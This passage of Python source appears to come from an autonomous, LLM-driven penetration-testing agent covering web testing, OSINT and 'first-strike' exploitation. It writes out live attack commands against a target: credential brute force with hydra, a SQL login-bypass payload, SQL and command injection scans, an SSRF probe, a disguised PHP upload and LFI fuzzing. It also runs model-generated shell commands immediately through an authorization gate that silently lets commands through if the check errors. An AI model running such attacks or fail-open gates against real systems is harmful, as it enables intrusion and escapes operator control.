        # ── WSTG-aligned WebOrchestrator (NEW) ──────────────────────
        # Runs the full 14-phase WSTG pipeline INSTEAD of the legacy
        # ad-hoc stages below.  Each phase emits live `wstg_phase_*`
        # events so the WebTesting GUI page can render the matrix.
        # The legacy stage code further down stays as a defensive
        # fallback only when the orchestrator import fails.
        try:
            from agents.web.web_orchestrator import WebOrchestrator
            orchestrator = WebOrchestrator(
                master_agent = self,
                web_agent    = agent,
                target       = target,
                web_ports    = web_ports,
                intel        = self._intel,
            )
            orch_summary = await orchestrator.run()
            self._intel["wstg_summary"] = orch_summary
            await self._emit("plan_step_update", {
                "step_id": "web_testing", "status": "done",
                "result":  f"WSTG: {orch_summary.get('total_findings', 0)} findings across "
                           f"{len(orch_summary.get('phases', {}))} phases",
                "detail":  ", ".join(orch_summary.get("targets") or [])[:200],
                "found":   orch_summary.get("total_findings", 0) > 0,
                "ts":      datetime.utcnow().isoformat(),
            })
            return    # WSTG-orchestrator handled everything — skip legacy stages
        except Exception as _orch_err:
            import logging as _l
            _l.getLogger(__name__).warning(
                "WebOrchestrator unavailable, falling back to legacy stages: %s",
                _orch_err,
            )
            # fall through to the legacy stage code below

        os_guess     = self._intel.get("os_guess", "unknown").lower()
        technologies = list(self._intel.get("technologies", []))
        known_paths  = list(self._intel.get("web_paths", []))
        all_findings = []

        for port in web_ports[:3]:   # cap at 3 ports
            port_int = int(str(port).split("/")[0])
            proto    = "https" if port_int in (443, 8443, 4443, 7443) else "http"
            base_url = f"{proto}://{target}:{port_int}"

            # ── Stage 1: Fingerprint ─────────────────────────────────────
            await self._emit("plan_step_update", {
                "step_id": f"web_fp_{port_int}",
                "status":  "active",
                "result":  f"[Stage 1] Fingerprinting {base_url}",
                "detail":  "Detecting tech stack, server, CMS, framework",
                "found":   None,
                "ts":      datetime.utcnow().isoformat()
            })
            await self.emit_reasoning(
                step       = f"web_fingerprint_{port_int}",
                reasoning  = f"Fingerprinting {base_url} before testing — determines wordlists, extensions, and which tools to run",
                decision   = "Run whatweb + curl headers + robots.txt + sitemap",
                next_action= "Detect: CMS, framework, server type, authentication method"
            )
            fp_tasks = [
                {"tool": "whatweb",  "args": f"-a 3 --colour=never {base_url}",
                 "purpose": "Technology fingerprint", "timeout": 30, "can_parallel": True},
                {"tool": "curl",     "args": f"-sI -m 10 --max-redirs 3 {base_url}",
                 "purpose": "HTTP response headers", "timeout": 15, "can_parallel": True},
                {"tool": "curl",     "args": f"-s -m 8 --max-redirs 2 {base_url}/robots.txt",
                 "purpose": "robots.txt discovery", "timeout": 10, "can_parallel": True},
                {"tool": "curl",     "args": f"-s -m 8 --max-redirs 2 {base_url}/sitemap.xml",
                 "purpose": "Sitemap structure", "timeout": 10, "can_parallel": True},
                {"tool": "curl",     "args": f"-s -m 8 {base_url}/.well-known/security.txt",
                 "purpose": "Security policy", "timeout": 8, "can_parallel": True},
            ]
            fp_result = await agent.execute_tasks(target, fp_tasks, "WEB_FINGERPRINT", self._intel)
            fp_raw = " ".join((fp_result.get("raw_outputs") or {}).values()).lower()

            # Detect technologies from fingerprint output
            is_wordpress = any(k in fp_raw for k in ("wordpress", "wp-content", "wp-login", "wp-json"))
            is_drupal    = "drupal" in fp_raw
            is_joomla    = any(k in fp_raw for k in ("joomla", "/components/", "/modules/"))
            is_django    = "django" in fp_raw
            is_dotnet    = any(k in fp_raw for k in ("asp.net", "x-aspnet", "aspnetcore", ".aspx", "viewstate"))
            is_php       = any(k in fp_raw for k in ("php", "x-php", "phpsessid"))
            is_java      = any(k in fp_raw for k in ("java", "jsessionid", "servlet", "spring", "j2ee"))
            is_nodejs    = any(k in fp_raw for k in ("node.js", "express", "nodejs", "x-powered-by: express"))
            is_iis       = any(k in fp_raw for k in ("iis", "microsoft-iis", "x-powered-by: asp.net"))
            is_apache    = "apache" in fp_raw
            is_nginx     = "nginx" in fp_raw
            is_win_web   = is_iis or is_dotnet or "windows" in os_guess

            # Enrich intel with detected tech
            for tech, flag in [("wordpress", is_wordpress), ("drupal", is_drupal),
                                ("joomla", is_joomla), ("django", is_django),
                                ("asp.net", is_dotnet), ("iis", is_iis)]:
                if flag and tech not in technologies:
                    technologies.append(tech)
                    if tech not in self._intel.get("technologies", []):
                        self._intel.setdefault("technologies", []).append(tech)

            await self._emit("plan_step_update", {
                "step_id": f"web_fp_{port_int}",
                "status":  "done",
                "result":  f"[Stage 1] Fingerprint complete — detected: {', '.join(technologies) or 'generic web'}",
                "found":   bool(technologies),
                "ts":      datetime.utcnow().isoformat()
            })

            # ── Stage 2: Discovery ───────────────────────────────────────
            await self._emit("plan_step_update", {
                "step_id": f"web_disc_{port_int}",
                "status":  "active",
                "result":  f"[Stage 2] Discovering endpoints on {base_url}",
                "detail":  "Directory enum with tech-appropriate wordlists",
                "found":   None,
                "ts":      datetime.utcnow().isoformat()
            })
            await self.emit_reasoning(
                step       = f"web_discovery_{port_int}",
                reasoning  = f"Discovery phase: enumerate paths, find login pages, APIs, upload endpoints",
                decision   = f"Using {'Windows/IIS' if is_win_web else 'CMS-specific' if any([is_wordpress,is_drupal,is_joomla]) else 'generic'} wordlist strategy",
                next_action= f"gobuster dir on {base_url}"
            )
            # Choose wordlist and extensions based on detected tech
            if is_win_web:
                wordlist   = "/usr/share/wordlists/dirb/common.txt"
                extensions = "asp,aspx,ashx,asmx,config,xml,html,bak,old,zip"
            elif is_wordpress:
                wordlist   = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
                extensions = "php,html,txt,bak,zip,sql,xml"
            elif is_java:
                wordlist   = "/usr/share/wordlists/dirb/common.txt"
                extensions = "jsp,jspx,do,action,xml,properties,html,bak"
            elif is_php:
                wordlist   = "/usr/share/wordlists/dirb/common.txt"
                extensions = "php,php5,php7,html,txt,bak,old,zip,sql,conf,xml,json"
            else:
                wordlist   = "/usr/share/wordlists/dirb/common.txt"
                extensions = "html,txt,bak,old,zip,conf,xml,json,js,yaml,yml"

            disc_tasks = [
                {"tool": "gobuster",
                 "args": f"dir -u {base_url} -w {wordlist} -x {extensions} "
                         f"-t 30 -q --no-error --timeout 10s -s 200,204,301,302,307,401,403",
                 "purpose": f"Directory enumeration ({extensions[:40]}...)",
                 "timeout": 180, "can_parallel": False},
            ]
            # CMS-specific tools run alongside gobuster if applicable
            if is_wordpress:
                disc_tasks.append({
                    "tool": "wpscan",
                    "args": f"--url {base_url} --enumerate p,t,u,vp --plugins-detection mixed "
                            f"--no-banner --format cli-no-color",
                    "purpose": "WordPress plugin/theme/user enumeration",
                    "timeout": 180, "can_parallel": True
                })
            elif is_drupal:
                disc_tasks.append({
                    "tool": "nmap",
                    "args": f"--script http-drupal-enum,http-vuln-cve2014-3704 -p {port_int} {target}",
                    "purpose": "Drupal vulnerability check",
                    "timeout": 60, "can_parallel": True
                })
            elif is_joomla:
                disc_tasks.append({
                    "tool": "curl",
                    "args": f"-s -m 10 {base_url}/administrator/ {base_url}/components/ {base_url}/modules/",
                    "purpose": "Joomla admin and component enumeration",
                    "timeout": 20, "can_parallel": True
                })

            disc_result = await agent.execute_tasks(target, disc_tasks, "WEB_DISCOVERY", self._intel)

            # Collect and classify discovered paths
            raw_paths = disc_result.get("web_paths", []) + disc_result.get("paths", []) + known_paths
            for p in raw_paths:
                if p not in self._intel["web_paths"]:
                    self._intel["web_paths"].append(p)

            login_paths  = [p for p in raw_paths if any(k in p.lower() for k in
                ["login", "signin", "admin", "auth", "dashboard", "portal",
                 "wp-admin", "wp-login", "manager", "console", "account", "user"])]
            upload_paths = [p for p in raw_paths if any(k in p.lower() for k in
                ["upload", "file", "image", "media", "attachment", "avatar", "import"])]
            api_paths    = [p for p in raw_paths if any(k in p.lower() for k in
                ["api", "rest", "graphql", "v1", "v2", "v3", "swagger", "openapi",
                 "json", "xml", "endpoint"])]
            form_paths   = [p for p in raw_paths if "?" in p]

            # Update intel with login pages
            for lp in login_paths:
                full_lp = f"{base_url}{lp}"
                if full_lp not in self._intel.get("login_pages", []):
                    self._intel.setdefault("login_pages", []).append(full_lp)

            await self._emit("plan_step_update", {
                "step_id": f"web_disc_{port_int}",
                "status":  "done",
                "result":  (f"[Stage 2] Discovery complete: {len(raw_paths)} paths found — "
                            f"{len(login_paths)} logins, {len(api_paths)} APIs, "
                            f"{len(upload_paths)} upload endpoints"),
                "found":   bool(raw_paths),
                "ts":      datetime.utcnow().isoformat()
            })
            await self.emit_reasoning(
                step       = f"web_discovery_result_{port_int}",
                reasoning  = f"Discovered {len(raw_paths)} paths: {len(login_paths)} login pages, {len(api_paths)} API endpoints, {len(upload_paths)} file upload endpoints",
                decision   = "Select targeted tests based on attack surface",
                next_action= (f"Auth testing: {bool(login_paths)} | "
                              f"SQLi: {bool(form_paths or True)} | "
                              f"API fuzzing: {bool(api_paths)} | "
                              f"Upload bypass: {bool(upload_paths)}")
            )

            # ── Stage 3: Baseline Scans (always run) ────────────────────
            await self._emit("plan_step_update", {
                "step_id": f"web_base_{port_int}",
                "status":  "active",
                "result":  f"[Stage 3] Running baseline scans on {base_url}",
                "detail":  "nikto + security headers + SSL check",
                "found":   None,
                "ts":      datetime.utcnow().isoformat()
            })
            baseline_tasks = [
                {"tool": "nikto",
                 "args": f"-h {base_url} -C all -maxtime 120 -Format txt -nointeractive",
                 "purpose": "Comprehensive server misconfiguration scan (A05)", "timeout": 150, "can_parallel": True},
                {"tool": "curl",
                 "args": f"-sI -m 10 --max-redirs 2 {base_url}",
                 "purpose": "Security headers audit (HSTS/CSP/X-Frame)", "timeout": 15, "can_parallel": True},
            ]
            if proto == "https":
                baseline_tasks.append({
                    "tool": "sslscan",
                    "args": f"--no-colour {target}:{port_int}",
                    "purpose": "TLS/SSL cipher and certificate audit", "timeout": 60, "can_parallel": True
                })
            if is_win_web:
                baseline_tasks.extend([
                    {"tool": "nmap",
                     "args": f"--script http-iis-webdav-vuln,http-iis-short-name-brute -p {port_int} {target}",
                     "purpose": "IIS WebDAV and short-name vulnerability check", "timeout": 60, "can_parallel": True},
                    {"tool": "nmap",
                     "args": f"--script http-auth-finder,http-ntlm-info -p {port_int} {target}",
                     "purpose": "Windows NTLM auth detection", "timeout": 30, "can_parallel": True},
                ])

            baseline_result = await agent.execute_tasks(target, baseline_tasks, "WEB_BASELINE", self._intel)
            all_findings.extend(baseline_result.get("vulnerabilities", []))

            # ── Stage 4: Targeted Attacks (finding-driven) ───────────────
            await self._emit("plan_step_update", {
                "step_id": f"web_atk_{port_int}",
                "status":  "active",
                "result":  f"[Stage 4] Targeted attacks on {base_url}",
                "detail":  "SQLi / Auth / SSRF / Upload / API — based on discovered surface",
                "found":   None,
                "ts":      datetime.utcnow().isoformat()
            })
            targeted_tasks = []

            # ◆ SQL Injection — always try; if params found target those specifically
            sqli_target = (f"{base_url}{form_paths[0]}" if form_paths
                           else f"{base_url}/ --crawl=2 --forms")
            targeted_tasks.append({
                "tool": "sqlmap",
                "args": (f"-u '{base_url}{form_paths[0]}' --batch --level=2 --risk=2 --dbs --timeout=20"
                         if form_paths else
                         f"-u '{base_url}/' --crawl=2 --batch --level=2 --risk=2 --forms --dbs --timeout=20"),
                "purpose": f"SQL injection test (A03) — {'param targeting' if form_paths else 'crawl mode'}",
                "timeout": 130, "can_parallel": True
            })

            # ◆ Authentication — only if login pages found
            if login_paths:
                lp = login_paths[0]
                targeted_tasks.extend([
                    {"tool": "hydra",
                     "args": (f"-L /usr/share/wordlists/metasploit/http_default_users.txt "
                              f"-P /usr/share/wordlists/metasploit/http_default_pass.txt "
                              f"-s {port_int} {target} http-post-form "
                              f"'{lp}:username=^USER^&password=^PASS^:incorrect'"),
                     "purpose": f"Default credential brute-force on {lp} (A07)",
                     "timeout": 60, "can_parallel": True},
                    {"tool": "curl",
                     "args": (f"-s -X POST -d \"username=' OR '1'='1&password=x\" "
                              f"-c /tmp/cookies_{port_int}.txt -L {base_url}{lp}"),
                     "purpose": f"SQL auth bypass test on {lp}",
                     "timeout": 15, "can_parallel": True},
                ])

            # ◆ SSRF — check URL parameters
            ssrf_params = ["url", "redirect", "next", "return", "goto", "target", "fetch", "proxy", "load"]
            ssrf_paths_found = [p for p in raw_paths
                                if any(f"?{param}=" in p or f"&{param}=" in p for param in ssrf_params)]
            if ssrf_paths_found:
                targeted_tasks.append({
                    "tool": "curl",
                    "args": (f"-s -m 10 '{base_url}{ssrf_paths_found[0]}' "
                             f"--data 'url=http://127.0.0.1:22/'"),
                    "purpose": f"SSRF probe on {ssrf_paths_found[0]} (A10)",
                    "timeout": 15, "can_parallel": True
                })

            # ◆ File upload bypass — only if upload endpoints exist
            if upload_paths:
                targeted_tasks.append({
                    "tool": "curl",
                    "args": (f"-s -X POST "
                             f"-F 'file=@/dev/urandom;filename=test.php;type=image/jpeg' "
                             f"{base_url}{upload_paths[0]}"),
                    "purpose": f"File upload MIME bypass test on {upload_paths[0]} (A08)",
                    "timeout": 15, "can_parallel": True
                })

            # ◆ API enumeration — if API paths found
            if api_paths:
                targeted_tasks.append({
                    "tool": "ffuf",
                    "args": (f"-u {base_url}{api_paths[0]}/FUZZ "
                             f"-w /usr/share/wordlists/dirb/common.txt "
                             f"-mc 200,201,204,400,401,403 -t 20 -timeout 5"),
                    "purpose": f"API endpoint fuzzing on {api_paths[0]}",
                    "timeout": 60, "can_parallel": True
                })

            # ◆ LFI check if any paths found
            targeted_tasks.append({
                "tool": "wfuzz",
                "args": (f"-c -z file,/usr/share/wfuzz/wordlist/vulns/lfi.txt "
                         f"--hc 404,400,500 {base_url}/FUZZ"),
                "purpose": "Local file inclusion probe (A01)",
                "timeout": 60, "can_parallel": True
            })

            # ◆ Command injection via commix on forms
            if form_paths or not is_win_web:
                targeted_tasks.append({
                    "tool": "commix",
                    "args": (f"--url={base_url}/ --crawl=1 --batch --level=2 "
                             f"--output-dir=/tmp/commix_{port_int}"),
                    "purpose": "OS command injection scan (A03)",
                    "timeout": 90, "can_parallel": True
                })

            # ◆ WebDAV write access
            targeted_tasks.append({
                "tool": "davtest",
                "args": f"-url {base_url}",
                "purpose": "WebDAV write access check",
                "timeout": 30, "can_parallel": True
            })

            targeted_result = await self._run_web_tasks_with_timeout(agent, target, targeted_tasks)
            all_findings.extend(targeted_result.get("vulnerabilities", []))
            for p in targeted_result.get("web_paths", []):
                if p not in self._intel["web_paths"]:
                    self._intel["web_paths"].append(p)

            # ── Set adaptive flags based on findings ─────────────────────
            if targeted_result.get("sqli_found") or any(
                    "sqli" in str(v).lower() or "sql injection" in str(v).lower()
                    for v in all_findings):
                self._intel["critical_web_vulns"] = True
                self._intel["sqli_confirmed"]     = True
                await self.emit_reasoning(
                    step       = "web_sqli_found",
                    reasoning  = "SQL injection confirmed — high-priority exploit path available",
                    decision   = "Flag for exploitation phase prioritisation",
                    next_action= "Exploit phase will target this SQLi for data exfil / shell"
                )

            await self._emit("plan_step_update", {
                "step_id": f"web_atk_{port_int}",
                "status":  "done",
                "result":  (f"[Stage 4] Targeted attacks complete on port {port_int}: "
                            f"{len(targeted_result.get('vulnerabilities', []))} vulnerabilities found"),
                "found":   bool(targeted_result.get("vulnerabilities")),
                "ts":      datetime.utcnow().isoformat()
            })

        # ── Final LLM analysis across all ports ─────────────────────────
        web_analysis = self._safe_llm_result(await self._llm_analyse_web_results(target, {
            "web_vulns":   all_findings,
            "web_paths":   self._intel["web_paths"],
            "login_pages": self._intel.get("login_pages", []),
            "technologies": technologies,
            "sqli_confirmed": self._intel.get("sqli_confirmed", False),
        }))
        await self.emit_reasoning(
            step       = "web_final_analysis",
            reasoning  = web_analysis.get("reasoning", ""),
            decision   = web_analysis.get("critical_findings", ""),
            next_action= web_analysis.get("exploit_recommendation", ""),
            data       = web_analysis
        )

        # Adaptive: if critical web vulns found, ensure exploit phase knows
        if web_analysis.get("critical_findings"):
            self._intel.setdefault("attack_path", []).append({
                "phase":  "web_testing",
                "result": web_analysis.get("critical_findings", ""),
                "ts":     datetime.utcnow().isoformat()
            })
            self._intel["critical_web_vulns"] = True

        await self._emit("plan_step_update", {
            "step_id": "web_testing",
            "status":  "done",
            "result":  (web_analysis.get("critical_findings")
                        or f"Web testing complete: {len(all_findings)} findings"),
            "detail":  (f"Paths: {len(self._intel.get('web_paths', []))} | "
                        f"Login pages: {len(self._intel.get('login_pages', []))} | "
                        f"Technologies: {', '.join(technologies[:5])}"),
            "found":   len(all_findings) > 0,
            "ts":      datetime.utcnow().isoformat()
        })

    async def _run_web_tasks_with_timeout(self, agent, target: str, tasks: List) -> Dict:
        """
        Runs web execute_tasks with an optional time-extension popup.
        If web_phase_timeout > 0 and the tasks don't finish in time, we emit
        awaiting_time_extension so the frontend shows the "Extend / Stop" dialog.
        The operator can extend multiple times; each extension grants the same
        extra period again.  Clicking "Stop" cancels the agent gracefully.
        """
        timeout_secs = self._web_phase_timeout

        if timeout_secs <= 0:
            # No time limit — run to completion
            return await agent.execute_tasks(target, tasks, "WEB_TESTING", self._intel)

        extension_key = "extend_web_testing"

        while True:
            try:
                result = await asyncio.wait_for(
                    agent.execute_tasks(target, tasks, "WEB_TESTING", self._intel),
                    timeout=float(timeout_secs)
                )
                return result
            except asyncio.TimeoutError:
                # Emit time-extension popup to frontend
                await self._emit("awaiting_time_extension", {
                    "phase":          "web_testing",
                    "timeout_secs":   timeout_secs,
                    "message": (
                        f"Web testing has been running for {timeout_secs}s. "
                        "Extend to continue or stop web testing now."
                    ),
                })

                # Prepare the extend event
                if extension_key not in self._extend_events:
                    self._extend_events[extension_key] = asyncio.Event()
                else:
                    self._extend_events[extension_key].clear()

                # Wait up to 5 minutes for the operator to respond
                try:
                    await asyncio.wait_for(
                        self._extend_events[extension_key].wait(),
                        timeout=300.0
                    )
                    # Operator clicked "Extend" — loop back and run again
                    await self._emit("phase_extended", {
                        "phase":   "web_testing",
                        "message": "Web testing time extended by operator",
                    })
                    await self._apply_pending_guidance()
                    # Reset agent state so it continues from where tools left off
                    # (execute_tasks with remaining tasks only — already-run tools cached)
                    continue
                except asyncio.TimeoutError:
                    # No response — stop web testing gracefully
                    agent.request_stop()
                    await self._emit("phase_stopped", {
                        "phase":   "web_testing",
                        "message": "Web testing stopped — no response to time extension request",
                    })
                    return {"web_paths": [], "paths": [], "login_pages": [],
                            "web_vulns": [], "raw_outputs": {}}

    # ─── PHASE: OSINT ─────────────────────────────────────────

    async def _phase_osint(self, target: str):
        """Master plans all OSINT tasks. Agent executes + extracts modules."""
        await self._apply_pending_guidance()
        await self._advance_phase(AttackPhase.OSINT)
        await self._emit("plan_step_update", {
            "step_id": "osint", "status": "active",
            "result":  "Searching ExploitDB and CVE databases",
            "detail":  "", "found": None, "ts": datetime.utcnow().isoformat()
        })

        from agents.osint_agent import OsintAgent
        agent = OsintAgent(broadcast=self.broadcast)
        agent._session_id = self._session_id
        self._osint_agent = agent

        osint_plan = self._safe_llm_result(await self._llm_plan_osint(target))
        await self.emit_reasoning(
            step       = "osint_planning",
            reasoning  = osint_plan.get("reasoning",""),
            decision   = f"OSINT tasks: {len(osint_plan.get('searches',[]))}",
            next_action= "searchsploit per service version + external intel"
        )
        tasks = [
            {"tool": s["tool"], "args": s.get("args",target),
             "purpose": s.get("purpose",""), "timeout": s.get("timeout",60),
             "can_parallel": True}
            for s in _safe_list(osint_plan.get("searches")) if s.get("tool")
        ]
        if not tasks:
            tasks = [{"tool":"searchsploit","args":self._intel.get("os_guess","linux"),
                      "purpose":"OS exploit search","timeout":30,"can_parallel":True}]

        result = await agent.execute_tasks(target, tasks, "OSINT", self._intel)

        if result.get("cves"):
            self._intel["cves"] = _merge_string_lists(self._intel["cves"], result.get("cves",[]))
        self._intel["exploit_modules"] += result.get("exploit_modules",[])
        self._merge_raw_outputs(result.get("raw_outputs",{}))

        # ── CRITICAL FIX ── propagate exploit_chain + next_commands +
        # critical_cves to master's intel.  OsintAgent.execute_tasks now
        # parses the LLM synthesis for actionable kill-chain data; we
        # surface it here so downstream phases can pivot immediately.
        if result.get("exploit_chain"):
            self._intel["exploit_chain"] = result["exploit_chain"]
        if result.get("critical_cves"):
            self._intel["critical_cves"] = list(dict.fromkeys(
                (self._intel.get("critical_cves") or []) +
                list(result["critical_cves"])
            ))
        if result.get("next_commands"):
            self._intel["next_commands"] = list(dict.fromkeys(
                (self._intel.get("next_commands") or []) +
                list(result["next_commands"])
            ))

        # ── PIVOT TRIGGER ── if OSINT identified a CRITICAL/HIGH chain
        # with concrete next commands, signal that the exploit phase
        # should run them as first-strike actions, and that vuln-id
        # heuristic scanning is redundant.  Flag is consumed downstream
        # in the phase router + _phase_exploit's first-action loop.
        chain = self._intel.get("exploit_chain") or {}
        chain_severity = (chain.get("severity") or
                           self._intel.get("risk_verdict") or "").lower()
        has_concrete_cmds = bool(self._intel.get("next_commands"))
        triggered_subagents = list(self._intel.get("triggered_subagents") or [])
        # Pivot when any of these holds:
        #   (a) OSINT synthesis identified a critical/high kill-chain, OR
        #   (b) the findings-trigger system queued first-strike commands
        #       (e.g. SMB null-session enum, Redis unauth probe — these
        #       are concrete next actions even without a CVE attached), OR
        #   (c) a trigger requested a subagent dispatch (AD recon, etc.)
        pivot_reasons: List[str] = []
        if chain_severity in ("critical", "high") and has_concrete_cmds:
            pivot_reasons.append(
                f"OSINT synthesis identified {chain_severity.upper()} "
                f"kill-chain (CVEs: {self._intel.get('critical_cves', [])[:3]})"
            )
        if has_concrete_cmds and not pivot_reasons:
            pivot_reasons.append(
                f"Findings-trigger system queued "
                f"{len(self._intel.get('next_commands') or [])} first-strike commands "
                f"based on discovered services"
            )
        if triggered_subagents:
            pivot_reasons.append(
                f"Triggered subagent(s) ready: {', '.join(triggered_subagents[:3])}"
            )
        if pivot_reasons:
            self._intel["pivot_to_exploit"] = True
            self._intel["pivot_reason"] = (
                " | ".join(pivot_reasons) +
                " — Skipping redundant generic enumeration; jumping to exploit."
            )
            await self.emit_reasoning(
                step="pivot_trigger",
                reasoning=self._intel["pivot_reason"],
                decision="PIVOT TO EXPLOIT",
                next_action="Execute pre-staged commands as first-strike actions",
            )

            # ── INLINE FIRST-STRIKE (the "exploit as soon as a lead exists" path) ───
            # The user's directive: "in a real red team, if you find one
            # entry point you exploit it and see."  Previously the system
            # would only execute next_commands once VULN_ANALYSIS,
            # ATTACK_PLANNING, and EXPLOIT phases had all spun up — a 90+
            # minute serial delay in the failed 7209s engagement.  We
            # execute the top 3 commands RIGHT HERE so they run within
            # seconds of the OSINT synthesis identifying them.
            try:
                await self._inline_first_strike(target, max_commands=3)
            except Exception as _fs_err:                              # noqa: BLE001
                import logging as _lf
                _lf.getLogger(__name__).warning(
                    "[inline_first_strike] failed (non-fatal, the regular "
                    "first-strike loop in _phase_exploit will still run): %s",
                    _fs_err,
                )

        self._intel["attack_path"].append({
            "phase":"osint",
            "result": f"Modules: {len(self._intel['exploit_modules'])} | CVEs: {len(self._intel['cves'])}"
                       + (f" | PIVOT: {self._intel.get('pivot_reason','')[:60]}..."
                          if self._intel.get("pivot_to_exploit") else ""),
            "ts": datetime.utcnow().isoformat()
        })
        await self._emit("plan_step_update", {
            "step_id": "osint",
            "status":  "done",
            "result":  f"ExploitDB modules: {self._intel.get('exploit_modules',[])[:3]}",
            "detail":  f"CVEs: {len(self._intel.get('cves',[]))} | Modules: {len(self._intel.get('exploit_modules',[]))}",
            "found":   len(self._intel.get("exploit_modules",[])) > 0,
            "ts":      datetime.utcnow().isoformat()
        })

        # ── Proactive Web Intelligence ─────────────────────────────────
        # OSINT phase already pulled CVE/module intel via searchsploit and
        # the OSINT subagents.  As a final step, ask the WebIntelAgent to
        # search authoritative pentest sources (HackTricks, exploit-db,
        # AttackerKB) for exploitation techniques specific to the
        # discovered service+version / CVE / framework signatures and
        # stash any extractable hints on intel['web_intel_hints'] so the
        # exploit phase planner sees them in the prompt context.
        try:
            # B-11 — make the proactive harvest IDEMPOTENT.  When _phase_osint
            # is called multiple times (resume from checkpoint, manual
            # re-trigger from UI), without this guard the harvest re-runs
            # and burns Google CSE quota + duplicates intel['web_intel_hints'].
            if self._intel.get("_web_intel_proactive_done"):
                return
            from agents.reasoning.web_intel_agent import WebIntelAgent
            wia = getattr(self, "_web_intel_agent", None)
            if wia is None:
                wia = WebIntelAgent(
                    master_agent = self,
                    session_id   = self._session_id,
                    target       = target,
                    broadcast    = self._broadcast_raw,
                )
                self._web_intel_agent = wia
            # Force-invoke regardless of stuck-state — proactive harvest
            queries = wia.build_queries(self._intel)
            if queries:
                await self.emit_reasoning(
                    step       = "web_intel_proactive",
                    reasoning  = f"Querying authoritative pentest sources for {len(queries)} signatures",
                    decision   = "Web intel proactive harvest at OSINT phase tail",
                    next_action= "Hint set will be available to exploit phase planner",
                )
                hints_total = 0
                for q in queries[: WebIntelAgent.MAX_QUERIES_PER_INVOCATION]:
                    try:
                        results = await wia.search(q)
                    except Exception:
                        results = []
                    if not results:
                        continue
                    pages = []
                    # Dedup + cap
                    seen: set = set()
                    ranked = sorted(results, key=lambda r: r.authority, reverse=True)
                    for r in ranked[: WebIntelAgent.MAX_FETCH_PER_INVOCATION]:
                        if r.url in seen:
                            continue
                        seen.add(r.url)
                        body = await wia.fetch_page(r.url)
                        if body:
                            pages.append((r, body))
                    if not pages:
                        continue
                    hints = await wia.extract_hints(pages, self._intel)
                    if hints:
                        self._intel.setdefault("web_intel_hints", []).extend(
                            h.to_dict() for h in hints
                        )
                        hints_total += len(hints)
                if hints_total:
                    await self.emit_reasoning(
                        step       = "web_intel_proactive_done",
                        reasoning  = f"Harvested {hints_total} exploit hints from authoritative sources",
                        decision   = "Hints stashed on intel['web_intel_hints'] for exploit-phase planner",
                        next_action= "Continue to vuln/exploit phase",
                    )
            # B-11 — mark complete so a re-run of _phase_osint won't repeat
            # the harvest.  Operator can clear the flag manually if they
            # want to re-harvest after collecting more intel.
            self._intel["_web_intel_proactive_done"] = True
        except Exception as _wia_err:
            import logging as _l
            _l.getLogger(__name__).warning(
                "Proactive web-intel harvest failed (non-fatal): %s", _wia_err
            )

    # ─── Inline First-Strike Helper ────────────────────────────
    #
    # Runs the top N next_commands RIGHT NOW (within whatever phase
    # called it) instead of waiting for the formal EXPLOIT phase to
    # spin up.  Used immediately after OSINT synthesis writes
    # intel["next_commands"] so a high-confidence chain is attempted
    # within seconds of identification, the way a human red-teamer
    # would.  Each command goes through the same engagement-context
    # gates (necessary basis + circuit breaker + budget) as a regular
    # subagent tool call, so this is NOT an escape hatch around the
    # safety layers — it's a phase-ordering optimisation.
    def _first_strike_already_run(self, cmd: str) -> bool:
        """Shared cross-consumer ledger for OSINT ``next_commands`` / first-strike
        shell commands.

        `next_commands` is read by THREE uncoordinated executors —
        ``_inline_first_strike`` (OSINT phase), the ``_phase_exploit``
        first-strike loop, and the entry-attempt dispatcher's
        ``pre_staged_commands`` — and is never drained.  Combined with
        ``_phase_exploit`` running up to 3× (bootstrap / stall-escalation /
        compromise-gate), the SAME heavy command (e.g. an ~11-min
        ``nmap -p- && nuclei`` chain) fired back-to-back.  This ledger makes a
        given normalized command execute AT MOST ONCE per engagement.  Returns
        True if the command already ran (caller should skip).
        """
        sig = " ".join((cmd or "").split())[:300]
        if not sig:
            return True
        seen = getattr(self, "_first_strike_sigs", None)
        if seen is None:
            seen = set()
            self._first_strike_sigs = seen
        if sig in seen:
            return True
        seen.add(sig)
        return False

    async def _inline_first_strike(self, target: str,
                                       max_commands: int = 3) -> None:
        cmds: List[str] = list(self._intel.get("next_commands") or [])
        if not cmds:
            return
        executed = 0
        for raw_cmd in cmds[:max_commands]:
            if self._stop_requested or self._intel.get("shell_access"):
                break
            cmd = (raw_cmd or "").strip()
            if not cmd:
                continue
            # Strip trailing comments ("# CVE-…")
            cmd_no_comment = cmd.split("#", 1)[0].strip()
            if not cmd_no_comment:
                continue
            # Shared ledger — skip if another consumer already ran this command.
            if self._first_strike_already_run(cmd_no_comment):
                continue
            # Pre-flight: consult engagement context's basis + circuit
            # breaker gates BEFORE dispatch.  Refused commands are
            # logged and skipped so the operator can see what was
            # filtered.
            try:
                from agents.engagement_context import (
                    get_context, check_command_warranted,
                )
                ctx = get_context(self._session_id) if self._session_id else None
                if ctx is not None:
                    ok, why = check_command_warranted(cmd_no_comment, ctx)
                    if not ok:
                        self._intel.setdefault("rejected_commands", []).append(
                            {"cmd": cmd_no_comment[:200], "reason": why[:200],
                             "stage": "inline_first_strike"}
                        )
                        await self.emit_reasoning(
                            step       = "inline_first_strike_skip",
                            reasoning  = f"Inline first-strike refused: {why[:200]}",
                            decision   = f"SKIP {cmd_no_comment[:80]!r}",
                            next_action= "Try next pre-staged command",
                        )
                        continue
            except Exception:
                pass
            # Dispatch as a bash subagent so all the existing tool-
            # execution plumbing (watchdog, broadcast, persistence)
            # applies.  Capture exception to keep the OSINT phase
            # robust — a single failed first-strike must not abort
            # the engagement.
            await self.emit_reasoning(
                step       = "inline_first_strike_run",
                reasoning  = (
                    f"Inline first-strike #{executed + 1} (within OSINT phase, "
                    f"before VULN/PLAN/EXPLOIT serialise) — "
                    f"command: {cmd_no_comment[:120]}"
                ),
                decision   = "EXECUTE NOW",
                next_action= "Capture output; proceed to next pre-staged command on completion",
            )
            try:
                await self._dispatch_to_agent(
                    tool    = "bash",
                    args    = cmd_no_comment,
                    purpose = (
                        f"OSINT-identified first-strike command "
                        f"executed inline during OSINT phase "
                        f"(skip VULN/PLAN serial delay)"
                    ),
                    phase   = "osint_first_strike",
                    timeout = 180,
                )
                executed += 1
            except Exception as exc:                            # noqa: BLE001
                import logging as _ll
                _ll.getLogger(__name__).warning(
                    "[inline_first_strike] command %r failed (non-fatal): %s",
                    cmd_no_comment[:120], exc,
                )
        if executed:
            await self._emit("inline_first_strike_summary", {
                "executed": executed,
                "skipped":  len(cmds[:max_commands]) - executed,
